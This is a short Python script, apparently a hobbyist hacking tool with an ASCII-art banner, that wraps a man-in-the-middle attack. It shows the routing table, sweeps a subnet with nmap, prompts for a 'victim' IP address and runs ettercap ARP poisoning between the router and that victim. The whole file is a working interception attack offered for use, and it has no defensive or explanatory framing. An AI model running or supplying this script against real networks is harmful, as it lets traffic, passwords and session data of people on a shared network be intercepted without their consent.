import os
import time
from scapy.all import ARP, Ether, srp
from colorama import Fore, Style, init
init()
logo = (f"{Fore.CYAN} ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ \n"
        f"░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓████████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░     {Style.RESET_ALL}")

def main():
    print(logo)
    print(f"{Fore.CYAN}Man In The Middle Attack{Style.RESET_ALL}")
    print('install gnome-terminal')
    print('works with "sudo"')
    time.sleep(1)
    os.system('ip r')
    router_ip = input('enter router ip (e.g., 192.168.0.1):\n')
    target_subnet = input("\nEnter the subnet to scan (e.g., 192.168.1.0/24):\n")
    os.system('nmap -sn {}\n'.format(target_subnet))
    time.sleep(0.5)
    victim = input('enter the victim ip address\n')
    os.system("sudo ettercap -T -S -i wlan0 -M arp:remote /{}// //{}/".format(router_ip,victim))

main()
